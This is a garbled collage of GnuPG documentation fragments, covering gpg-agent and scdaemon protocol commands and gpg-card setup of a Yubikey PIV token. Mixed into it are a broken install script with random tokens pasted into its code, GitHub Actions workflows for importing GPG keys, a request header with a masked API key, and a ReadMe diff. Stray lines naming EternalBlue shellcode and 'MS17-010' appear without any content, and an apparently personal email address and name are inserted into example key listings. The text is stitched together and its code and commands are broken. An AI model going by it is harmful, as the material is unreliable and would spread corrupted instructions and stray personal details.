PKSIGN --hash=algoname keyid +READKEY hexified_certid +READCERT hexified_certid|keyid +SERIALNO +Return the serial number of the card using a status response like:
S SERIALNO D27600000000000000000000
WRITEKEY [--force] keyid +SETDATA hexstring +to tell scdaemon about the data to be decrypted. The data must be given in hex notation. The actual decryption is then done using the command
PKDECRYPT keyid +CHECKPIN idstr +RESTART +APDU [--atr] [--more] [--exlen[=n]] [hexstring] +S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1
+./configure --sysconfdir=/etc --localstatedir=/va +CN=Wurzel ZS 3,O=Intevation GmbH,C=DE

A6935DD34EF3087973C706FC311AA2CCF733765B S
CN=PCA-1-Verwaltung-02/O=PKI-1-Verwaltung/C=DE

DC:BD:69:25:48:BD:BB:7E:31:6E:BB:80:D3:00:80:35:D4:F8:A6:CD S
CN=Root-CA/O=Schlapphuete/L=Pullach/C=DE

!14:56:98:D3:FE:9C:CA:5A:31:6E:BC:81:D3:11:4E:00:90:A3:44:C2 S
  # Key added on: 2011-07-20 20:38:46
  # Fingerprint:  5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81
  34B62F25E277CF13D3C6BCEBFD3F85D08F0A864B 0 confirm
+private-keys-v1.d/ +gpg-connect-agent 'help COMMAND' /bye +SETKEY +Tell the server about the key to be used for decryption. If this is not used, gpg-agent may try to figure out the key by trying to decrypt the message with each key available. +
sr/bin/env bash # # Description: One click install for hyperswitch router # # # Global config if [[ "${2bTVg9fClAhPbL68J6xfOrgm0wX_5aMWASRkma1TdCsrjw75q & api:// api://fc4d2d73-d05a-4a9b-85a8-4f2b3a5f38ed api:/// api://a8573488-ff46-450a-b09a-6eca0c6a02dc/fc4d2d73-d05a-4a9b-85a8-4f2b3a5f38ed api:/// api://a8573488-ff46-450a-b09a-6eca0c6a02dc/api api:/// api://productapi/fc4d2d73-d05a-4a9b-85a8-4f2b3a5f38ed Hsm key}" == "1" ]]; then set -o xtrace fi RUST_MSRV=1.65.0 _DB_NAME="hyperswitch_db" _DB_USER="db_user" _DB_PASS="db_password" OSTYPE=${GITHUB:-} PRE_INSTALL_MSG="Dependency install script.\n The script assumes 'curl' and build essentials like gcc/clang are already installed.\n \n The script will\n 1. Install or update RUST using RUSTUP\n 2. Install Postgresql server and redis server, if found missing\n 3. Install diesel_cli program to setup database\n 4. Setup database and create necessary schema\n " POST_INSTALL_MSG="\n Install was successful.\n If rust was installed, restart the shell or configure current shell using 'SOURCE $HOME/.cargo/env'\n " # Used variables must be initialized set -o nounset # utilities # convert semver to comparable integer if [[ id -u -ne 0 ]]; then print_info "requires sudo" SUDO=sudo else SUDO="" fi ver () { printf "%03d%03d%03d%03d" echo "$1" | tr '.' ' '; } PROGNAME=basename $0 print_info () { echo -e "$GODPROGRAM: $" } err () { print_info "ERROR:" $ exit 1 } need_cmd () { if ! command -v {}" not found. Bailing out" fi } prompt () { read -p "$? [y/N] :" ANS case $ANS in [Yy]) return 1;; ) return 0;; esac } init_start_postgres () { if [[ "${S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1) & (FF020001008A77C1)" == "darwin" ]]; then initdb -U postgres -D /var/lib/postgres/data elif command -v su > /dev/null; then $SUDO su -c "initdb -D /var/lib/postgres/data" postgres elif command -v sudo > /dev/null; then sudo -u postgres "initdb -D /var/lib/postgres/data" else err "Don't know how to switch to postgres user to run commands" fi if command -v brew > /dev/null; then brew services start postgresql elif command -v service > /dev/null; then service postgresql start elif command -v systemctl > /dev/null; then $SUDO systemctl start postgresql.service else print_info "Unable to start postgres. Please start manually" fi } init_start_redis () { if command -v brew > /dev/null; then brew services start redis elif command -v service > /dev/null; then service redis-server start service redis start elif command -v systemctl > /dev/null; then $SUDO systemctl start redis.service
PKDECRYPT +The agent checks whether this command is allowed and then does an INQUIRY to get the ciphertext the client should then send the cipher text.
S: INQUIRE CIPHERTEXT
C: D (xxxxxx
C: D xxxx)
C: END +Please note that the server may send status info lines while reading the data lines from the client. The data send is a SPKI like S-Exp with this structure:
(enc-val
  (<algo>
    (<param_name1> <mpi>)
...
    (<param_namen> <mpi>)))
+Where algo is a string with the name of the algorithm; see the libgcrypt documentation for a list of valid algorithms. The number and names of the parameters depend on the algorithm. The agent does return an error if there is an inconsistency. + +If the decryption was successful the decrypted data is returned by means of "D" lines. + +Here is an example session: +

C: PKDECRYPT
S: INQUIRE CIPHERTEXT
C: D (enc-val elg (a 349324324)
C: D (b 3F444677CA)))
C: END
S: # session key follows
S: S PADDING 0
S: D (value 1234567890ABCDEF0)
S: OK decryption successful +The “PADDING” status line is only send if gpg-agent can tell what kind of padding is used. As of now only the value 0 is used to indicate that the padding has +SIGKEY +This can be used multiple times to create multiple signature, the list of keys is reset with the next PKSIGN command or a RESET. The server tests whether the key is a valid key to sign something and responds with okay.
SETHASH --hash=| +sig-val
  (<algo>
    (<param_name1> <mpi>)
...
    (<param_namen> <mpi>)))
+The operation is affected by the option +

OPTION use-cache-for-signing=0|1 +The default of 1 uses the cache. Setting this option to 0 will lead gpg-agent to ignore the passphrase cache. Note, that there is also a global command line option for gpg-agent to globally disable the caching.
+Here is an example session: +

C: SIGKEY
S: OK key available
C: SIGKEY
S: OK key available
C: PKSIGN
S: # I did ask the user whether he really wants to sign
S: # I did ask the user for the passphrase
S: INQUIRE HASHVAL
C: D ABCDEF012345678901234
C: END
S: # signature follows
S: D (sig-val rsa (s 45435453654612121212))
S: OK
GENKEY [--no-protection] [--preset] [<cache_nonce>] +Invokes the key generation process and the server will then inquire on the generation parameters, like:
S: INQUIRE KEYPARM
C: D (genkey (rsa (nbits 1024)))
C: END +The format of the key parameters which depends on the algorithm is of the form:
(genkey
 (algo
   (parameter_name_1 ....)
     ....
   (parameter_name_n ....)))
+If everything succeeds, the server returns the public key in a SPKI like S-Expression like this: +

(public-key
  (rsa
(n )
(e ))) +Here is an example session:
C: GENKEY
S: INQUIRE KEYPARM
C: D (genkey (rsa (nbits 1024)))
C: END
S: D (public-key
S: D (rsa (n 326487324683264) (e 10001)))
S OK key created
ISTRUSTED <5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81> +LISTTRUSTED +GpgAgent returns a list of trusted keys line by line:
S: D 000000001234454556565656677878AF2F1ECCFF P
S: D 340387563485634856435645634856438576457A P
S: D FEDC6532453745367FD83474357495743757435D S
S: OK +The first item on a line is the hexified fingerprint where MD5 fingerprints are 00 padded to the left and the second item is a flag to indicate the type of key (so that gpg is able to only take care of PGP keys). P = OpenPGP, S = S/MIME. A client should ignore the rest of the line, so that we can extend the format in the future. +Ok +Finally a client should be able to mark a key as trusted:
MARKTRUSTED fingerprint "P"|"S" +The server will then pop up a window to ask the user whether she really trusts this key. For this it will probably ask for a text to be displayed like this:
S: INQUIRE TRUSTDESC
C: D Do you trust the key with the fingerprint @FPR@
C: D bla fasel blurb.
C: END
S: OK +GET_PASSPHRASE [--data] [--check] [--no-ask] [--repeat[=N]] \
            [--qualitybar] cache_id                \
            [error_message prompt description]
+PRESET_PASSPHRASE [--inquire] <string_or_keygrip> [] + +HAVEKEY keygrips

GET_CONFIRMATION description
LEARN [--send] +UPDATESTARTUPTTY +SETDATA hexstring
PKSIGN keyid
PKSIGN --hash=algoname keyid
+READCERT hexified_certid|keyid +READKEY hexified_certid +SETDATA hexstring +d +

PKSIGN keyid
LEARN
PKSIGN --hash=algoname keyid
+WRITEKEY [--force] keyid +WRITEKEY [--force] keyid +PASSWD [--reset] [--nullpin] chvno +CHECKPIN idstr +APDU [--atr] [--more] [--exlen[=n]] [hexstring] +this: +

S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1
+--auto-key-import + +command --locate-external-key +command --locate-external-key +github/workflows/release.yml: +ldap://keys.(thedomain) +‘--auto-key-locate

--auto-key-locate +--auto-key-retrieve
honor-keyserver-url
+-sig-keyserver-url +--recv-key +honor-keyserver-url +--use-agent +--gpg-agent-info + + +--no-random-seed-file +Host: c7-use-3.algolianet. com +Accept: / +Sec-Fetch-Site: cross-site +Accept-Language: en-US, en; q=0.9 +Accept-Encoding: gzip, deflate, br +Sec-Fetch-Mode: cors x-algolia-application-id: A7KCVJZ91B +Origin: https://dashboard.algolia.com +User-Agent: Mozilla/5.0 (iPhone; CPU iPhone 0S 17_3 like Mac 0S X) AppleWe +x-algolia-api-key: b3cf*************************米** +Content-Length: 27 +Connection: keep-alive +Content-Type: application/x-www-form-urlencoded +Sec-Fetch-Dest: empty + +scdaemon.conf +1 +HKCU\Software\GNU\GnuPG:DefaultLogFile, +--debug-level level +HKCU\Software\GNU\GnuPG:DefaultLogFile, +scd-event +HKCU\Software\GNU\GnuPG:HomeDir +HKCU\Software\GNU\GnuPG:DefaultLogFile, +reader_n.status +HKCU\Software\GNU\GnuPG:HomeDir + +trustlist.txt file +gpg-agent.conf +HKCU\Software\GNU\GnuPG:HomeDir +name: release +debug-pinentry +--debug 1024 + +global trustlist (/usr/local/etc/gnupg/trustlist.tx + +Active cards +Active cards (inserted into a card reader or plugged in tokens) are always tried; they are ordered by their serial numbers. +gpg-connect-agent updatestartuptty /bye +Although all GnuPG components try to start the gpg-agent as needed, this is not possible for the ssh support because ssh does not know about it. Thus if no GnuPG tool which accesses the agent has been run, there is no guarantee that ssh is able to use gpg-agent for authentication. To fix this you may start gpg-agent if needed using this simple command: + +gpg-connect-agent /bye +--scdaemon-program filename +Use program filename as the Smartcard daemon. The default is installation dependent and can be shown with the gpgconf +--check-passphrase-pattern file +--check-sym-passphrase-pattern file +Check the passphrase against the pattern given in file. When entering a new passphrase matching one of these pattern a warning will be displayed. If file does not contain any slashes and does not start with "~/" it is searched in the system configuration directory (/usr/local/etc/gnupg) +bin\pinentry.exe, ..\Gpg4win\bin\pinentry.exe, ..\Gpg4win\pinentry.exe, ..\GNU\GnuPG\pinentry.exe, ..\GNU\bin\pinentry.exe, bin\pinentry-basic.exe +Keys listed in the sshcontrol file +--disable-extended-key-format +These options are obsolete and have no effect. The extended key format is used for years now and has been supported since 2.1.12. Existing keys in the old format are migrated to the new format as soon as they are touched. + +--enable-ssh-support +--enable-win32-openssh-support +--enable-putty-support + +gpg-connect-agent 'GETINFO s2k_count' /bye +gpg-connect-agent 'GETINFO s2k_time' /bye +To view the auto-calibrated count use: + +gpg-connect-agent 'GETINFO s2k_count_cal' /bye +--ssh-fingerprint-digest +Keys listed in the sshcontrol file + +Active card +gpg-connect-agent /bye +bashrc or whatever initialization file is used for all shell invocations: + +GPG_TTY=$(tty) +export GPG_TTY +--daemon [command line] +server + +agent-program file ¶ +Specify the agent program to be started if none is running. The default value is determined by running gpgconf with the option --list-dirs. + +--gpg-program file +Specify a non-default gpg binary to be used by certain commands. + +--gpgsm-program file +Specify a non-default gpgsm binary to be used by certain commands. + +--chuid uid +Change the current user to uid which may either be a number or a name. This can be used from the root account to run gpg-card for another user. If uid is not the current UID a standard PATH is set and the envvar GNUPGHOME is unset. To override the latter the option --homedir can be used. This option has only an effect when used on the command line. This option has currently no effect at all on Windows. + +gpg-card +AUTHENTICATE [--setkey] [--raw] [< file]|010203040506070801020304050607080102030405060708] ¶ +AUTH +FETCH +GENERATE [--force] [--algo=algo{+algo2}] keyref +KDF-SETUP ¶ +Prepare the OpenPGP card KDF feature for this card. + +LANG [--clear] +Change the language info for the card. This info can be used by applications for a personalized greeting. Up to 4 two-digit language identifiers can be entered as a preference. The option --clear removes all identifiers. GnuPG does not use this info. + +LIST [--cards] [--apps] [--info] [--no-key-lookup] [n] [app] +NAME [--clear] +PRIVATEDO [--clear] n [< file] file +READCERT [--openpgp] certref > file ¶ +Read the certificate for key certref and store it in file. With option --openpgp an OpenPGP keyblock wrapped in a dedicated CMS content type (OID=1.3.6.1.4.1.11591.2.3.1) is expected and extracted to file. Note that for current OpenPGP cards a certificate may only be available at the certref "OPENPGP.3". +URL [--clear] +gpg's. --fetch +WRITECERT certref < file ¶ +WRITECERT --openpgp certref [< file|fpr] +WRITECERT --clear certref

--openpgp +file +fpr. +WRITEKEY [--force] keyref keygrip ¶ +Write a private key object identified by keygrip to the card under the id keyref. +CHECKKEYS [--ondisk] [--delete-clear-copy] [--delete-protected-copy] ¶ +Serial number +A hex-string with the serial number of the card.
+Type +This gives the type of the card’s application. For example "OpenPGP" or "PIV". + +Keygrip +A hex-string identifying a key. + +Keyref +The application slot where the key is stored on the card. For example "OpenPGP.1" + +Status +The status of the key. The most common value is "shadowed" for a key where only the public key along with the card’s serial number is stored on the disk. The value "clear" indicates that a copy of the card’s key is stored unprotected on disk. The value "protected" indicated that a copy of the car’s key is stored on disk but is protected by a password. The value "error" may also be shown if there was a problem reading information from the card. + +YUBIKEY cmd args +Various commands pertaining to Yubikey tokens with cmd being: + +LIST +List supported and enabled Yubikey applications. + +ENABLE usb|nfc|all [otp|u2f|opgp|piv|oath|fido2|all] +DISABLE +Enable or disable the specified or all applications on the given interface. + +The support for OpenPGP cards in gpg-card is not yet complete. For missing features, please continue to use gpg --card-edit. + +GnuPG has support for PIV cards (“Personal Identity Verification” as specified by NIST Special Publication 800-73-4). This section describes how to initialize (personalize) a fresh Yubikey token featuring the PIV application (requires Yubikey-5). We assume that the credentials have not yet been changed and thus are: + +Authentication key +This is a 24 byte key described by the hex string +010203040506070801020304050607080102030405060708. + +PIV Application PIN +This is the string 123456. + +PIN Unblocking Key +This is the string 12345678. +list (the string gpg/card> +card> list +Reader ...........: 1050:0407:X:0 +Card type ........: yubikey +Card firmware ....: 5.1.2 +Serial number ....: D2760001240102010006090746250000 +Application type .: OpenPGP +Version ..........: 2.1 +[...] +on:

push:
tags:
 - "v*"
+permissions:

contents: write
+jobs:

release:
runs-on: ubuntu-latest
steps:
 - uses: actions/checkout@v3
 - uses: cli/gh-extension-precompile@v1
   with:
     go_version: "1.16"
+Then +- uses: cli/gh-extension-precompile@v1

env:
CGO_ENABLED: 1 +- uses: cli/gh-extension-precompile@v1
with:
build_script_override: "script/build.sh" +name: release
+on:

push:
tags:
 - "v*"
+permissions:

contents: write
+jobs:

release:
runs-on: ubuntu-latest
steps:
 - uses: actions/checkout@v3
 - id: import_gpg
   uses: crazy-max/ghaction-import-gpg@v5
   with:
     gpg_private_key: ${{ secrets.GPG_PRIVATE_KEY }}
     passphrase: ${{ secrets.GPG_PASSPHRASE }}
 - uses: cli/gh-extension-precompile@v1
   with:
     gpg_fingerprint: ${{ steps.import_gpg.outputs.fingerprint }}
+# macOS +gpg --armor --export-secret-key joe@foo.bar | pbcopy + +# Ubuntu (assuming GNU base64) +gpg --armor --export-secret-key joe@foo.bar -w0 | xclip + +# Arch +gpg --armor --export-secret-key joe@foo.bar | xclip -selection clipboard -i + +# FreeBSD (assuming BSD base64) +gpg --armor --export-secret-key joe@foo.bar | xclip + +name: import-gpg + +on:

push:
branches: master
+jobs:

import-gpg:
runs-on: ubuntu-latest
steps:
 -
   name: Checkout
   uses: actions/checkout@v4
 -
   name: Import GPG key
   uses: crazy-max/ghaction-import-gpg@v6
   with:
     gpg_private_key: ${{ secrets.GPG_PRIVATE_KEY }}
     passphrase: ${{ secrets.PASSPHRASE }}
 -
   name: List keys
   run: gpg -K
+name: import-gpg + +on:

push:
branches: master
+gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB +gpg/card> writecert PIV.9D < encr.crt + +jobs:

import-gpg:
runs-on: ubuntu-latest
steps:
 -
   name: Checkout
   uses: actions/checkout@v4
 -
   name: Import GPG key
   uses: crazy-max/ghaction-import-gpg@v6
   with:
     gpg_private_key: ${{ secrets.GPG_PRIVATE_KEY }}
     passphrase: ${{ secrets.PASSPHRASE }}
     fingerprint: "C17D11ADF199F12A30A0910F1F80449BE0B08CB8"
 -
   name: List keys
   run: gpg -K
+pub ed25519 2021-09-24 [C]

 87F257B89CE462100BEC0FFE6071D218380FDCC8
 Keygrip = F5C3ABFAAB36B427FD98C4EDD0387E08EA1E8092
+uid [ unknown] Joe Bar joe@bar.foo +sub ed25519 2021-09-24 [S]

 C17D11ADF199F12A30A0910F1F80449BE0B08CB8
 Keygrip = DEE0FC98F441519CA5DE5D79773CB29009695FEB
+name: import-gpg +/.gnupg/scdaemon.conf and by restarting scdaemon, either by killing the process or by using gpgconf --kill scdaemon. Finally the default order in which card applications are tried by scdaemon can be changed. For example to prefer PIV over OpenPGP it is sufficient to add + +application-priority piv +to ~/.gnupg/scdaemon.conf and to restart scdaemon. This has an effect only on tokens which support both, PIV and OpenPGP, but does not hamper the use of OpenPGP only tokens. + +With one of these methods employed the list command of gpg-card shows this: + +gpg/card> list +Reader ...........: 1050:0407:X:0 +Card type ........: yubikey +Card firmware ....: 5.1.2 +Serial number ....: FF020001008A77C1 +Application type .: PIV +Version ..........: 1.0 +Displayed s/n ....: yk-9074625 +PIN usage policy .: app-pin +PIN retry counter : - 3 - +PIV authentication: [none]

 keyref .....: PIV.9A
+Card authenticat. : [none]

 keyref .....: PIV.9E
+Digital signature : [none]

 keyref .....: PIV.9C
+Key management ...: [none]

 keyref .....: PIV.9D
+34798AAFE0A7565088101CC4AE31C5C8C74461CB.key +list --cards +well. The PIV authentication key (internal reference PIV.9A +Card authentication key (PIV.9E) is also known as the CAK and used to support physical access applications. The private key is not protected by a PIN and can thus immediately be used. The Digital signature key (PIV.9C) is used to digitally sign documents. The use of the associated private key is protected by the Application PIN which needs to be provided for each signing operation. The Key management key (PIV.9D) is used for encryption + +gpg/card> auth 010203040506070801020304050607080102030405060708 +gpg/card> auth < myauth.key + +gpg/card> generate --algo=nistp384 PIV.9A +PIV card no. yk-9074625 detected +gpg/card> generate --algo=nistp256 PIV.9E +PIV card no. yk-9074625 detected +gpg/card> generate --algo=rsa2048 PIV.9C +PIV card no. yk-9074625 detected

‘--force’ +gpg/card> list +Reader ...........: 1050:0407:X:0 +Card type ........: yubikey +Card firmware ....: 5.1.2 +Serial number ....: FF020001008A77C1 +Application type .: PIV +Version ..........: 1.0 +Displayed s/n ....: yk-9074625 +PIN usage policy .: app-pin +PIN retry counter : - 3 - +PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E
 keyref .....: PIV.9A  (auth)
 algorithm ..: nistp384
+Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C

 keyref .....: PIV.9E  (auth)
 algorithm ..: nistp256
+Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED

 keyref .....: PIV.9C  (sign,cert)
 algorithm ..: rsa2048
+Key management ...: [none]

 keyref .....: PIV.9D
+keygrip +gpg +self-signed X.509 certificate (exit the gpg-card tool, first): + +$ gpgsm --gen-key -o encr.crt

(1) RSA
(2) Existing key
(3) Existing key from card +Your selection? 1 +What keysize do you want? (3072) 2048 +Requested keysize is 2048 bits +Possible actions for a RSA key:
(1) sign, encrypt
(2) sign
(3) encrypt +Your selection? 3 +Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE +Enter email addresses (end with an empty line): +> otto@example.net +> +Enter DNS names (optional; end with an empty line): +> +Enter URIs (optional; end with an empty line): +> +Create self-signed certificate? (y/N) y +These parameters are used:
Key-Type: RSA
Key-Length: 2048
Key-Usage: encrypt
Serial: random
Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE
Name-Email: otto@example.net
+Proceed with creation? (y/N) +Now creating self-signed certificate. This may take a while ... +gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB +gpgsm: certificate created +Ready. +$ gpgsm --import encr.crt +gpgsm: certificate imported +gpgsm: total number processed: 1 +gpgsm: imported: 1 +gpg/card> list +Reader ...........: 1050:0407:X:0 +Card type ........: yubikey +Card firmware ....: 5.1.2 +Serial number ....: FF020001008A77C1 +Application type .: PIV +Version ..........: 1.0 +Displayed s/n ....: yk-9074625 +PIN usage policy .: app-pin +PIN retry counter : - 3 - +PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E

 keyref .....: PIV.9A  (auth)
 algorithm ..: nistp384
+Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C

 keyref .....: PIV.9E  (auth)
 algorithm ..: nistp256
+Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED

 keyref .....: PIV.9C  (sign,cert)
 algorithm ..: rsa2048
+Key management ...: [none]

 keyref .....: PIV.9D
+keygrip +gpgsm --gen-key -o encr.crt

(1) RSA
(2) Existing key
(3) Existing key from card +Your selection? 1 +What keysize do you want? (3072) 2048 +Requested keysize is 2048 bits +Possible actions for a RSA key:
(1) sign, encrypt
(2) sign
(3) encrypt +Your selection? 3 +Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE +Enter email addresses (end with an empty line): +> otto@example.net +> +Enter DNS names (optional; end with an empty line): +> +Enter URIs (optional; end with an empty line): +> +Create self-signed certificate? (y/N) y +These parameters are used:
Key-Type: RSA
Key-Length: 2048
Key-Usage: encrypt
Serial: random
Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE
Name-Email: otto@example.net
+Proceed with creation? (y/N) +Now creating self-signed certificate. This may take a while ... +gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB +gpgsm: certificate created +Ready. +$ gpgsm --import encr.crt +gpgsm: certificate imported +gpgsm: total number processed: 1 +gpgsm: imported: 1 + +gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB +gpg/card> writecert PIV.9D < encr.crt + +gpgsm --with-keygrip -k 6309304695z@gmail.com +Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB

 keyref .....: PIV.9D  (encr)
 algorithm ..: rsa2048
 used for ...: X.509
   user id ..: CN=Encryption key for yk-9074625,O=example,C=DE
   user id ..: <6309304695z@gmail.com>
+34798AAFE0A7565088101CC4AE31C5C8C74461CB.key + +$ gpgsm --learn +$ gpgsm --gen-key -o sign.crt +Please select what kind of key you want:

(1) RSA
(2) Existing key
(3) Existing key from card +Your selection? 3 +Serial number of the card: FF020001008A77C1 +Available keys:
(1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384
(2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256
(3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048
(4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 +Your selection? 3 +Possible actions for a RSA key:
(1) sign, encrypt
(2) sign
(3) encrypt +Your selection? 2 +Enter the X.509 subject name: CN=Signing key for yk-9074625,O=example,C=DE +Enter email addresses (end with an empty line): +> 6309304695z@gmail.com +> +Enter DNS names (optional; end with an empty line): +> +Enter URIs (optional; end with an empty line): +> +Create self-signed certificate? (y/N) +These parameters are used:
Key-Type: card:PIV.9C
Key-Length: 1024
Key-Usage: sign
Serial: random
Name-DN: CN=Signing key for yk-9074625,O=example,C=DE
Name-Email: 6309304695z@gmail.com
+Proceed with creation? (y/N) y +Now creating self-signed certificate. This may take a while ... +gpgsm: about to sign the certificate for key: &32A6C6FAFCB8421878608AAB452D5470DD3223ED +gpgsm: certificate created +Ready. +$ gpgsm --import sign.crt +gpgsm: certificate imported +gpgsm: total number processed: 1 +gpgsm: imported: 1 + +‘gpgsm --learn’ +Digital signature’ key +gpg-card:010203040506070801020304050607080102030405060708 + +shellcode/eternalblue_sc_merge.py + +gpg/card> writecert PIV.9C < sign.crt on: push: branches: master @@ -26967,4 +27804,4 @@ curl -L \

-H "Accept: application/vnd.github+json"
diff --git a/ReadMe.md b/ReadMe.md index 9f10a05..2888fcd 100644 --- a/ReadMe.md +++ b/ReadMe.md @@ -1,3 +1,1210 @@ +diff --git a/ReadMe.md b/ReadMe.md +index 7278f80..41b298d 100644 +--- a/ReadMe.md ++++ b/ReadMe.md +@@ -709,7 +709,844 @@ Digital signature’ key

gpg-card:
gpg/card> writecert PIV.9C < sign.crt ++# MS17-010 ++# 000006 ++Reader ...........: 1050:0407:X:0 ++Card type ........: yubikey ++Card firmware ....: 5.1.2 ++Serial number ....: FF020001008A77C1 ++Application type .: PIV ++Version ..........: 1.0 ++Displayed s/n ....: yk-9074625 ++PIN usage policy .: app-pin ++PIN retry counter : - [verified] - ++PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E ++ keyref .....: PIV.9A (auth) ++ algorithm ..: nistp384 ++Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C ++ keyref .....: PIV.9E (auth) ++ algorithm ..: nistp256 ++Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED ++ keyref .....: PIV.9C (sign,cert) ++ algorithm ..: rsa2048 ++ used for ...: X.509 ++ user id ..: CN=Signing key for yk-9074625,O=example,C=DE ++ user id ..: <6309304695z@gmail.co ++ m> ++Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB ++ keyref .....: PIV.9D (encr) ++ algorithm ..: rsa2048 ++ used for ...: X.509 ++ user id ..: CN=Encryption key for yk-9074625,O=example,C=DE ++ user id ..: 6309304695z@gmail.com ++ PIV authentication’ key with ssh: ++ ++$ ssh-add -l ++384 SHA256:0qnJ0Y0ehWxKcx2frLfEljf6GCdlO55OZed5HqGHsaU cardno:yk-9074625 (ECDSA) ++ssh-add with the uppercase ‘-L ++$ gpgsm --learn ++$ gpg --full-gen-key ++Please select what kind of key you want: ++ (1) RSA and RSA (default) ++ (2) DSA and Elgamal ++ (3) DSA (sign only) ++ (4) RSA (sign only) ++ (14) Existing key from card ++Your selection? 14 ++Serial number of the card: FF020001008A77C1 ++Available keys: ++ (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth) ++ (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth) ++ (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign) ++ (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr) ++Your selection? 3 ++Please specify how long the key should be valid. ++ 0 = key does not expire ++ = key expires in n days ++ w = key expires in n weeks ++ m = key expires in n months ++ y = key expires in n years ++Key is valid for? (0) ++Key does not expire at all ++Is this correct? (y/N) y ++ ++GnuPG needs to construct a user ID to identify your key. ++ ++Real name: keith bieszczat ++Email address: 6309304695z@gmail.com ++Comment: https://scpf-foundation-roblox.fandom.com/wiki/The_Administrator ++You selected this USER-ID: ++ "6309304695z@gmail.com" ++ ++Change (N)ame, (C)omment, (E)mail or (O)kay/(Q)uit? o ++gpg: key C3AFA9ED971BB365 marked as ultimately trusted ++gpg: revocation certificate stored as '[...]D971BB365.rev' ++public and secret key created and signed. ++ ++Note that this key cannot be used for encryption. You may want to use ++the command "--edit-key" to generate a subkey for this purpose. ++pub rsa2048 2019-04-04 [SC] ++ 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365 ++uid 6309304695z@gmail.com ++ ++ run gpg in --expert mode ++ $ gpg --edit-key 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365 ++Secret key is available. ++ ++sec rsa2048/C3AFA9ED971BB365 ++ created: 2019-04-04 expires: never usage: SC ++ card-no: FF020001008A77C1 ++ trust: ultimate validity: ultimate ++[ultimate] (1). otto@example.net ++gpg> addkey ++Secret parts of primary key are stored on-card. ++Please select what kind of key you want: ++ (3) DSA (sign only) ++ (4) RSA (sign only) ++ (5) Elgamal (encrypt only) ++ (6) RSA (encrypt only) ++ (14) Existing key from card ++Your selection? 14 ++Serial number of the card: FF020001008A77C1 ++Available keys: ++ (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth) ++ (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth) ++ (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign) ++ (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr) ++Your selection? 4 ++Please specify how long the key should be valid. ++ 0 = key does not expire ++ = key expires in n days ++ w = key expires in n weeks ++ m = key expires in n months ++ y = key expires in n years ++Key is valid for? (0) ++Key does not expire at all ++Is this correct? (y/N) y ++Really create? (y/N) y ++ ++sec rsa2048/C3AFA9ED971BB365 ++ created: 2019-04-04 expires: never usage: SC ++ card-no: FF020001008A77C1 ++ trust: ultimate validity: ultimate ++ssb rsa2048/7067860A98FCE6E1 ++ created: 2019-04-04 expires: never usage: E ++ card-no: FF020001008A77C1 ++[ultimate] (1). otto@example.net ++ ++gpg> save ++ ++/* 32A19-D90712
++LEVEL-5 CLEARANCE ONLY ++ ‘--force’ ++authentication key ++-header-'010203040506070801020304050607080102030405060708' ++SETDATA hexstring ++to tell scdaemon about the data to be signed. The data must be given in hex notation. The actual signing is done using the command ++ ++ PKSIGN keyid ++where keyid is the hexified ID of the key to be used. The key id may have been retrieved using the command LEARN. If another hash algorithm than SHA-1 is used, that algorithm may be given like: ++ ++ PKSIGN --hash=algoname keyid ++READKEY hexified_certid ++READCERT hexified_certid|keyid ++SERIALNO ++Return the serial number of the card using a status response like: ++ ++ S SERIALNO D27600000000000000000000 ++ WRITEKEY [--force] keyid ++SETDATA hexstring ++to tell scdaemon about the data to be decrypted. The data must be given in hex notation. The actual decryption is then done using the command ++ ++ PKDECRYPT keyid ++CHECKPIN idstr ++RESTART ++APDU [--atr] [--more] [--exlen[=n]] [hexstring] ++S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1 ++ ++./configure --sysconfdir=/etc --localstatedir=/va ++CN=Wurzel ZS 3,O=Intevation GmbH,C=DE ++ A6935DD34EF3087973C706FC311AA2CCF733765B S ++ ++ # CN=PCA-1-Verwaltung-02/O=PKI-1-Verwaltung/C=DE ++ 